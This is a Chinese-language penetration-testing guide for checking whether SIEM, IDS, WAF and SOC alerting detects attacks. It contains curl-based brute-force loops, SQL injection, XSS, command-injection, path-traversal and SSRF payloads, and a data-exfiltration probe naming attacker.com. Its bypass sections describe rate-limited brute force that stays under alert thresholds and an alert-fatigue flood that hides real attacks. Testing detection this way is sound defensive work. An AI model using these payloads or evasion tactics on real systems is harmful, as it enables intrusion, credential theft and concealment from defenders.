# 告警有效性测试 (Alert Effectiveness Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供安全告警系统有效性测试的系统化方法论，帮助测试人员评估告警规则的覆盖率和准确性。

### 1.2 适用范围
本文档适用于以下场景：
- SIEM 告警规则测试
- IDS/IPS 告警有效性评估
- 应用层告警系统测试
- 安全运营中心（SOC）响应能力验证

### 1.3 读者对象
- 渗透测试工程师
- 安全运营分析师
- 威胁检测工程师
- 安全架构师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

告警有效性测试是指通过模拟真实攻击行为，验证安全告警系统能否及时、准确地检测并告警攻击活动。

**核心原理：**
- **攻击模拟**：使用真实攻击技术触发告警
- **覆盖率评估**：检测哪些攻击未被发现
- **误报评估**：检测哪些告警是误报
- **响应时间测试**：测量从攻击到告警的时间

### 2.2 测试常见于哪些业务场景

| **业务场景** | **功能示例** | **应触发告警** |
| :--- | :--- | :--- |
| **暴力破解** | 多次登录失败 | 登录失败阈值告警 |
| **SQL 注入** | 注入 payload | WAF/IDS 告警 |
| **XSS 攻击** | XSS payload | WAF 告警 |
| **目录遍历** | 路径遍历尝试 | 访问控制告警 |
| **异常行为** | 非工作时间访问 | UEBA 告警 |
| **数据外传** | 大量数据下载 | DLP 告警 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**暴力破解告警测试：**
```bash
# 测试登录失败告警
# 假设阈值为 5 次失败

for i in {1..10}; do
    curl -X POST "http://target/login" \
         -d "username=admin&password=wrong$i"
    echo "Attempt $i"
    sleep 2
done

# 检查：
# 1. 是否触发告警
# 2. 告警时间（第几次尝试后）
# 3. 是否触发账户锁定
```

**SQL 注入告警测试：**
```bash
# 测试 SQL 注入检测
# 基础 payload
curl "http://target/api/user?id=1' OR '1'='1"
curl "http://target/api/user?id=1; DROP TABLE users--"
curl "http://target/api/user?id=1 UNION SELECT * FROM users--"

# 盲注 payload
curl "http://target/api/user?id=1 AND SLEEP(5)"
curl "http://target/api/user?id=1 AND 1=1"

# 检查是否触发 WAF 或 IDS 告警
```

**XSS 告警测试：**
```bash
# 测试 XSS 检测
curl "http://target/search?q=<script>alert(1)</script>"
curl "http://target/search?q=<img src=x onerror=alert(1)>"
curl "http://target/search?q=javascript:alert(1)"

# 编码绕过测试
curl "http://target/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
curl "http://target/search?q=&#60;script&#62;alert(1)&#60;/script&#62;"
```

#### 2.3.2 告警延迟测试

```bash
# 测量告警响应时间
start=$(date +%s%N)

# 触发攻击
curl "http://target/api/exploit"

# 轮询检查告警
while true; do
    response=$(curl -s "http://siem/api/alerts?since=$start")
    if echo "$response" | grep -q "exploit"; then
        end=$(date +%s%N)
        duration=$(( (end - start) / 1000000 ))
        echo "Alert triggered after ${duration}ms"
        break
    fi
    sleep 1
done
```

### 2.4 漏洞利用方法

#### 2.4.1 识别告警盲区

```bash
# 系统性地测试各种攻击技术
# 使用 MITRE ATT&CK 矩阵作为参考

# 1. 初始访问技术
curl "http://target/spearphishing-link"

# 2. 执行技术
curl "http://target/api/exec?cmd=whoami"

# 3. 持久化技术
curl -X POST "http://target/api/cron" \
     -d "command=malicious&schedule=* * * * *"

# 4. 权限提升
curl "http://target/api/sudo?user=attacker"

# 5. 防御规避
curl "http://target/api/logs?action=clear"

# 6. 凭证访问
curl "http://target/api/credentials/dump"

# 7. 发现
curl "http://target/api/network/scan"

# 8. 横向移动
curl "http://target/api/lateral/exec"

# 9. 收集
curl "http://target/api/data/archive"

# 10. 外传
curl "http://target/api/data/exfil?dest=attacker.com"

# 记录哪些攻击未触发告警
```

#### 2.4.2 告警阈值探测

```bash
# 探测告警触发阈值
# 例如：登录失败告警阈值

threshold=0
for i in {1..20}; do
    curl -X POST "http://target/login" \
         -d "username=admin&password=wrong"
    
    # 检查是否触发告警
    if check_alert(); then
        threshold=$i
        echo "Alert triggered at attempt $i"
        break
    fi
done

echo "Threshold: $threshold"
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过告警阈值

```bash
# 如果阈值为 N 次/分钟
# 将攻击分散到多个时间窗口

# 例如：阈值为 5 次/分钟
# 策略：每 15 秒尝试 1 次
while true; do
    curl -X POST "http://target/login" \
         -d "username=admin&password=wrong"
    sleep 15
done
```

#### 2.5.2 告警疲劳攻击

```bash
# 触发大量误报告警淹没 SOC
for i in {1..1000}; do
    # 触发低级别告警
    curl "http://target/api/test?suspicious_pattern_$i" &
done

# SOC 可能被大量告警淹没
# 真实攻击混在其中
```

---

## 第三部分：附录

### 3.1 告警有效性测试清单

| **攻击类型** | **测试 Payload** | **预期告警** | **结果** |
| :--- | :--- | :--- | :--- |
| 暴力破解 | 10 次失败登录 | 登录失败告警 | ☐ |
| SQL 注入 | ' OR '1'='1 | WAF/IDS 告警 | ☐ |
| XSS | <script>alert(1)</script> | WAF 告警 | ☐ |
| 目录遍历 | ../../../etc/passwd | 访问控制告警 | ☐ |
| 命令注入 | ; cat /etc/passwd | WAF/IDS 告警 | ☐ |
| 文件包含 | ?page=php://filter | WAF 告警 | ☐ |
| SSRF | ?url=http://169.254.169.254 | 网络告警 | ☐ |
| 数据外传 | 大量数据下载 | DLP 告警 | ☐ |

### 3.2 告警质量评估标准

- **准确性**：告警是否为真实威胁
- **及时性**：从攻击到告警的时间
- **可操作性**：告警是否包含足够调查信息
- **优先级**：告警级别是否与威胁匹配
- **关联能力**：相关告警是否能关联分析

### 3.3 参考资源

- [MITRE ATT&CK](https://attack.mitre.org/)
- [NIST 800-61 Incident Response Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
- [SANS Incident Response](https://www.sans.org/incident-response/)
